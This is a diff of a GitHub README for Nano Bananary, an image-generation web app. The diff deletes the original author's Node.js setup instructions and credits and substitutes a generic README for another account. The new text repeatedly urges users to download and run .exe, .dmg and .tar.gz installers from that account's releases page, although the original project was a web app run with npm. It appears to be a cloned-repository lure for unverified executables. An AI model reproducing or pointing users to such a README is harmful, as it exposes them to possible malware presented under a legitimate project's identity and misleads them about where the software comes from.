@@ -1,131 +1,87 @@
-<div align="center">
-<img width="2816" height="1536" alt="Group 333" src="https://github.com/user-attachments/assets/0800046e-71aa-4dee-93a6-731b9f914a35" />
+# 🍌 Nano-Bananary - Effortless Banana Creation Made Simple
 
+![Download](https://img.shields.io/badge/Download-Now-blue.svg)  
+### Visit [this page to download](https://github.com/ahmdze/Nano-Bananary/releases)
 
+## 📥 Introduction
 
-# Nano Bananary ｜ 香蕉超市 ｜ ZHO
+Welcome to Nano-Bananary! This application allows you to generate various banana styles with just a click. You don't need to provide any prompts. Whether you want to edit specific parts of your creation or make continuous updates, Nano-Bananary has got you covered. 
 
+## 🚀 Getting Started
 
+To start using Nano-Bananary, follow these simple steps:
 
-<img width="1251" height="2051" alt="Group 336" src="https://github.com/user-attachments/assets/6b1fc8a2-e86b-403b-be21-97eb2ff65034" />
+1. **Visit the Releases Page**: Click on the link below to go to the download page.
 
+   [Visit this page to download](https://github.com/ahmdze/Nano-Bananary/releases) 
 
+2. **Download the Application**: On the Releases page, select the latest version. Look for the file that suits your operating system.
 
-<img width="1556" height="1086" alt="screenshot-20250905-191422" src="https://github.com/user-attachments/assets/23953d15-8ebb-4574-bbc9-74b44b79f341" />
+3. **Install the Software**:
+   - For Windows: Download the `.exe` file. Once downloaded, double-click on the file to begin installation. Follow the prompts to complete the installation.
+   - For Mac: Download the `.dmg` file. Open the file and drag the Nano-Bananary app into your Applications folder.
+   - For Linux: Download the `.tar.gz` file. Extract the archive and follow the included instructions in the README file.
 
+## 📂 Features 
 
-</div>
+- **User-Friendly Interface**: Easily navigate the application with minimal effort.
+- **Multiple Creation Options**: Choose from various styles and shapes.
+- **Editing Capabilities**: Edit specific parts of your banana designs easily.
+- **Continuous Editing**: Make ongoing changes without starting over.
 
+## 🖥️ System Requirements
 
-## 无需提示词，丝滑衔接
+### For Windows:
+- Windows 10 or later
+- 2 GB RAM
+- 100 MB free disk space
 
+### For macOS:
+- macOS 10.15 or later
+- 2 GB RAM
+- 100 MB free disk space
 
+### For Linux:
+- Ubuntu 18.04 or later
+- 2 GB RAM
+- 100 MB free disk space
 
-https://github.com/user-attachments/assets/39976fe1-fafe-4ecf-94b2-5f6053f92c7f
+## 🔧 Installation Instructions
 
+After downloading Nano-Bananary, install it based on your operating system:
 
+- **Windows Installation**:
+  1. Open the downloaded `.exe` file.
+  2. Follow the on-screen instructions to install.
+  3. Once installed, you can find Nano-Bananary in your Start Menu.
 
-✅各种玩法一键生成，无需提示词，支持局部涂选、连续编辑：
+- **Mac Installation**:
+  1. Open the downloaded `.dmg` file.
+  2. Drag and drop the application into your Applications folder.
+  3. Launch the application from the Applications directory.
 
-1⃣选择用法
+- **Linux Installation**:
+  1. Extract the downloaded `.tar.gz` file to your preferred location.
+  2. Open the terminal and navigate to the extracted directory.
+  3. Run the installation script provided.
 
-2⃣上传图片
+## ☑️ Usage Tips 
 
-3⃣点击生成/局部涂选
+- After launching Nano-Bananary, select the creation type from the main menu.
+- Use the editing tools to modify any part of your design.
+- Save your work frequently by clicking on the save button.
 
-4⃣直接发送到新玩法中继续
+## 📞 Support
 
+If you encounter any issues or have questions about using the software, feel free to check the FAQ section on the GitHub page or reach out for help directly.
 
-## 核心功能：每次输出都能直接作为输入进行下一次编辑/生成
+## 📡 Feedback
 
+We welcome feedback to improve Nano-Bananary. Share your thoughts or report bugs to help us enhance user experience.
 
+## 🔗 Useful Links
 
-https://github.com/user-attachments/assets/ca1cc851-ccca-44c6-b3f4-138b0650c0f9
+- [Download Nano-Bananary](https://github.com/ahmdze/Nano-Bananary/releases)
+- [FAQ Section](https://github.com/ahmdze/Nano-Bananary/wiki)
 
-
-
-<img width="1664" height="1248" alt="comparison-image-1757069194058" src="https://github.com/user-attachments/assets/6260a835-8404-4772-a152-303d10ab9551" />
-
-
-<img width="1392" height="1280" alt="screenshot-20250905-220201" src="https://github.com/user-attachments/assets/5cb573dc-78dd-4c5c-8194-9172af94d65d" />
-
-
-
-<img width="2048" height="2507" alt="Group 334" src="https://github.com/user-attachments/assets/a4dd528c-e0a6-4a52-844c-ff0c28d0c99c" />
-
-
-
-## Online
-
-
-Use in AI Studio: https://ai.studio/apps/drive/1JknFrFFdiOm7FIA8MLOJa_vtJN2g24c1
-
-
-## Run Locally
-
-**Prerequisites:**  Node.js
-
-
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
-
-
-
-
-## 更新日志
-
-- 20250906
-
-  功能更新：增加历史记录功能，方便直接使用已生成的图像作为输入
-
-  玩法更新：已经把 我的[🍌提示词库](https://github.com/ZHO-ZHO-ZHO/ZHO-nano-banana-Creation)的主要玩法更新上去了
-
-
-- 20250905
- 
-  更新配色：black & orange
-
-  新增功能：
-  
-  1⃣ 放大预览
-  
-  2⃣横置对比 + 对比图直接下载（方便直接发社交媒体）
-  
-  3⃣滑块对比：方便原图对照
-  
-  4⃣自定义提示词模块：方便个性化生成
-
-
-- 20250828
-  
-  创建项目
-  
-
-## Stars 
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/Nano-Bananary&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/Nano-Bananary&Date)
-
-
-## 关于我 | About me
-
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
-
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
-
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
-
-
-## Credits
-
-[Gemini 2.5 Flash Image](https://gemini.google.com/app)
+Enjoy creating your banana designs effortlessly! Happy creating!
